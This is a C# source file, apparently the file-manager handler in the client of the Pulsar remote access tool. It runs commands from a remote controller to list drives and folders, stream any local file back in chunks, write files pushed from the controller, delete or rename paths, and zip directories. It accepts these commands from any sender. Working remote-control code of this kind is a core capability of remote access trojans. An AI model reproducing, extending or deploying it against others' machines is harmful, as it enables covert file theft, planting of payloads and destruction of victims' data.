using Pulsar.Client.Networking;
using Pulsar.Common;
using Pulsar.Common.Enums;
using Pulsar.Common.Extensions;
using Pulsar.Common.Helpers;
using Pulsar.Common.IO;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.FileManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using System;
using System.Collections.Concurrent;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security;
using System.Threading;

namespace Pulsar.Client.Messages
{
    public class FileManagerHandler : NotificationMessageProcessor, IDisposable
    {
        private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
        private readonly Semaphore _limitThreads = new Semaphore(2, 2);

        private readonly PulsarClient _client;

        private CancellationTokenSource _tokenSource;
        private CancellationToken _token;

        public FileManagerHandler(PulsarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (connected)
            {
                _tokenSource?.Dispose();
                _tokenSource = new CancellationTokenSource();
                _token = _tokenSource.Token;
            }
            else
            {
                _tokenSource.Cancel();
            }
        }

        // ---------------------------------------------------------
        // CLEAN FIX: SAFELY SEND COMPLETED SIGNAL (RETRIES, NO RACE)
        // ---------------------------------------------------------
        private void SendCompleted(ISender client, int id, string path)
        {
            for (int i = 0; i < 2; i++)
            {
                try
                {
                    client.Send(new FileTransferComplete
                    {
                        Id = id,
                        FilePath = path
                    });
                    return;
                }
                catch
                {
                    Thread.Sleep(20);
                }
            }
        }

        public override bool CanExecute(IMessage message) =>
            message is GetDrives ||
            message is GetDirectory ||
            message is FileTransferRequest ||
            message is FileTransferCancel ||
            message is FileTransferChunk ||
            message is DoPathDelete ||
            message is DoPathRename ||
            message is DoZipFolder;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDrives msg: Execute(sender, msg); break;
                case GetDirectory msg: Execute(sender, msg); break;
                case FileTransferRequest msg: Execute(sender, msg); break;
                case FileTransferCancel msg: Execute(sender, msg); break;
                case FileTransferChunk msg: Execute(sender, msg); break;
                case DoPathDelete msg: Execute(sender, msg); break;
                case DoPathRename msg: Execute(sender, msg); break;
                case DoZipFolder msg: HandleDoZipFile(sender, msg); break;
            }
        }

        // --------------------------------------
        // ZIP FOLDER
        // --------------------------------------
        private void HandleDoZipFile(ISender client, DoZipFolder message)
        {
            try
            {
                if (!Directory.Exists(message.SourcePath))
                {
                    client.Send(new SetStatusFileManager { Message = $"Directory not found: {message.SourcePath}" });
                    return;
                }

                client.Send(new SetStatusFileManager { Message = $"Creating zip archive: {message.DestinationPath}" });

                string parentDir = Path.GetDirectoryName(message.DestinationPath);
                if (!Directory.Exists(parentDir))
                    Directory.CreateDirectory(parentDir);

                if (File.Exists(message.DestinationPath))
                    File.Delete(message.DestinationPath);

                ZipFile.CreateFromDirectory(
                    message.SourcePath,
                    message.DestinationPath,
                    (CompressionLevel)message.CompressionLevel,
                    includeBaseDirectory: false);

                client.Send(new SetStatusFileManager { Message = $"Successfully created zip: {message.DestinationPath}" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatusFileManager { Message = $"Error creating zip: {ex.Message}" });
            }
        }

        // --------------------------------------
        // GET DRIVES
        // --------------------------------------
        private void Execute(ISender client, GetDrives command)
        {
            try
            {
                var driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
                if (driveInfos.Length == 0)
                {
                    client.Send(new SetStatusFileManager { Message = "GetDrives No drives", SetLastDirectorySeen = false });
                    return;
                }

                Drive[] drives = new Drive[driveInfos.Length];
                for (int i = 0; i < drives.Length; i++)
                {
                    try
                    {
                        var d = driveInfos[i];
                        string displayName = string.IsNullOrEmpty(d.VolumeLabel)
                            ? $"{d.RootDirectory.FullName} [{d.DriveType.ToFriendlyString()}, {d.DriveFormat}]"
                            : $"{d.RootDirectory.FullName} ({d.VolumeLabel}) [{d.DriveType.ToFriendlyString()}, {d.DriveFormat}]";

                        drives[i] = new Drive
                        {
                            DisplayName = displayName,
                            RootDirectory = d.RootDirectory.FullName
                        };
                    }
                    catch { }
                }

                client.Send(new GetDrivesResponse { Drives = drives });
            }
            catch
            {
                client.Send(new SetStatusFileManager { Message = "GetDrives Failed", SetLastDirectorySeen = false });
            }
        }

        // --------------------------------------
        // GET DIRECTORY
        // --------------------------------------
        private void Execute(ISender client, GetDirectory message)
        {
            bool isError = false;
            string status = null;

            Action<string> error = m => { isError = true; status = m; };

            try
            {
                DirectoryInfo info = new DirectoryInfo(message.RemotePath);

                var files = info.GetFiles();
                var dirs = info.GetDirectories();

                FileSystemEntry[] items = new FileSystemEntry[files.Length + dirs.Length];

                int pos = 0;
                foreach (var d in dirs)
                {
                    items[pos++] = new FileSystemEntry
                    {
                        EntryType = FileType.Directory,
                        Name = d.Name,
                        Size = 0,
                        LastAccessTimeUtc = d.LastAccessTimeUtc
                    };
                }

                foreach (var f in files)
                {
                    items[pos++] = new FileSystemEntry
                    {
                        EntryType = FileType.File,
                        Name = f.Name,
                        Size = f.Length,
                        ContentType = Path.GetExtension(f.Name).ToContentType(),
                        LastAccessTimeUtc = f.LastAccessTimeUtc
                    };
                }

                client.Send(new GetDirectoryResponse
                {
                    RemotePath = message.RemotePath,
                    Items = items
                });
            }
            catch (UnauthorizedAccessException) { error("GetDirectory No permission"); }
            catch (SecurityException) { error("GetDirectory No permission"); }
            catch (PathTooLongException) { error("GetDirectory Path too long"); }
            catch (DirectoryNotFoundException) { error("GetDirectory Directory not found"); }
            catch (IOException) { error("GetDirectory I/O error"); }
            catch { error("GetDirectory Failed"); }
            finally
            {
                if (isError)
                    client.Send(new SetStatusFileManager { Message = status, SetLastDirectorySeen = true });
            }
        }

        // --------------------------------------
        // FILE UPLOAD (server ↔ client)
        // --------------------------------------
        private void Execute(ISender client, FileTransferRequest message)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();

                try
                {
                    using (var srcFile = new FileSplit(message.RemotePath, FileAccess.Read))
                    {
                        _activeTransfers[message.Id] = srcFile;
                        OnReport("File upload started");

                        foreach (var chunk in srcFile)
                        {
                            if (_token.IsCancellationRequested ||
                                !_activeTransfers.ContainsKey(message.Id))
                                break;

                            _client.SendBlocking(new FileTransferChunk
                            {
                                Id = message.Id,
                                FilePath = message.RemotePath,
                                FileSize = srcFile.FileSize,
                                Chunk = chunk
                            });
                        }

                        // --- FIXED ---
                        SendCompleted(client, message.Id, message.RemotePath);
                        Thread.Sleep(5);
                    }
                }
                catch
                {
                    client.Send(new FileTransferCancel
                    {
                        Id = message.Id,
                        Reason = "Error reading file"
                    });
                }
                finally
                {
                    RemoveFileTransfer(message.Id);
                    _limitThreads.Release();
                }
            }).Start();
        }

        // --------------------------------------
        // FILE DOWNLOAD (client receives chunks)
        // --------------------------------------
        private void Execute(ISender client, FileTransferChunk message)
        {
            try
            {
                if (message.Chunk.Offset == 0)
                {
                    string filePath = message.FilePath;

                    if (string.IsNullOrEmpty(filePath))
                        filePath = FileHelper.GetTempFilePath(message.FileExtension);
                    else
                    {
                        filePath = ValidateAndSanitizeFilePath(filePath);
                        if (filePath == null)
                        {
                            client.Send(new FileTransferCancel
                            {
                                Id = message.Id,
                                Reason = "Invalid file path - security violation"
                            });
                            return;
                        }
                    }

                    if (File.Exists(filePath))
                        NativeMethods.DeleteFile(filePath);

                    _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
                    OnReport("File download started");
                }

                if (!_activeTransfers.ContainsKey(message.Id))
                    return;

                var dest = _activeTransfers[message.Id];
                dest.WriteChunk(message.Chunk);

                if (dest.FileSize == message.FileSize)
                {
                    // --- FIXED ---
                    SendCompleted(client, message.Id, dest.FilePath);
                    Thread.Sleep(5);
                    RemoveFileTransfer(message.Id);
                }
            }
            catch
            {
                RemoveFileTransfer(message.Id);
                client.Send(new FileTransferCancel
                {
                    Id = message.Id,
                    Reason = "Error writing file"
                });
            }
        }

        // --------------------------------------
        // CANCEL TRANSFER
        // --------------------------------------
        private void Execute(ISender client, FileTransferCancel message)
        {
            if (_activeTransfers.ContainsKey(message.Id))
            {
                RemoveFileTransfer(message.Id);
                client.Send(new FileTransferCancel
                {
                    Id = message.Id,
                    Reason = "Canceled"
                });
            }
        }

        // --------------------------------------
        // SECURITY: VALIDATE PATH
        // --------------------------------------
        private string ValidateAndSanitizeFilePath(string filePath)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(filePath)) return null;

                string full = Path.GetFullPath(filePath);
                if (!Path.IsPathRooted(full)) return null;

                string name = Path.GetFileName(full);
                if (string.IsNullOrEmpty(name) || name.Contains("..")) return null;

                if (name.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0) return null;

                string dir = Path.GetDirectoryName(full);
                if (string.IsNullOrEmpty(dir)) return null;

                if (!Directory.Exists(dir))
                    Directory.CreateDirectory(dir);

                return full;
            }
            catch { return null; }
        }

        // --------------------------------------
        // DELETE FILE / DIRECTORY
        // --------------------------------------
        private void Execute(ISender client, DoPathDelete message)
        {
            bool err = false;
            string msg = null;

            Action<string> onErr = m => { err = true; msg = m; };

            try
            {
                switch (message.PathType)
                {
                    case FileType.Directory:
                        Directory.Delete(message.Path, true);
                        client.Send(new SetStatusFileManager { Message = "Deleted directory" });
                        break;

                    case FileType.File:
                        File.Delete(message.Path);
                        client.Send(new SetStatusFileManager { Message = "Deleted file" });
                        break;
                }

                Execute(client, new GetDirectory
                {
                    RemotePath = Path.GetDirectoryName(message.Path)
                });
            }
            catch (UnauthorizedAccessException) { onErr("DeletePath No permission"); }
            catch (PathTooLongException) { onErr("DeletePath Path too long"); }
            catch (DirectoryNotFoundException) { onErr("DeletePath Path not found"); }
            catch (IOException) { onErr("DeletePath I/O error"); }
            catch { onErr("DeletePath Failed"); }
            finally
            {
                if (err)
                    client.Send(new SetStatusFileManager { Message = msg });
            }
        }

        // --------------------------------------
        // RENAME PATH
        // --------------------------------------
        private void Execute(ISender client, DoPathRename message)
        {
            bool err = false;
            string msg = null;

            Action<string> onErr = m => { err = true; msg = m; };

            try
            {
                switch (message.PathType)
                {
                    case FileType.Directory:
                        Directory.Move(message.Path, message.NewPath);
                        client.Send(new SetStatusFileManager { Message = "Renamed directory" });
                        break;

                    case FileType.File:
                        File.Move(message.Path, message.NewPath);
                        client.Send(new SetStatusFileManager { Message = "Renamed file" });
                        break;
                }

                Execute(client, new GetDirectory
                {
                    RemotePath = Path.GetDirectoryName(message.NewPath)
                });
            }
            catch (UnauthorizedAccessException) { onErr("RenamePath No permission"); }
            catch (PathTooLongException) { onErr("RenamePath Path too long"); }
            catch (DirectoryNotFoundException) { onErr("RenamePath Path not found"); }
            catch (IOException) { onErr("RenamePath I/O error"); }
            catch { onErr("RenamePath Failed"); }
            finally
            {
                if (err)
                    client.Send(new SetStatusFileManager { Message = msg });
            }
        }

        // --------------------------------------
        // CLEANUP
        // --------------------------------------
        private void RemoveFileTransfer(int id)
        {
            if (_activeTransfers.ContainsKey(id))
            {
                _activeTransfers[id]?.Dispose();
                _activeTransfers.TryRemove(id, out _);
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _tokenSource.Cancel();
                _tokenSource.Dispose();

                foreach (var t in _activeTransfers.Values)
                    t?.Dispose();

                _activeTransfers.Clear();
            }
        }
    }
}
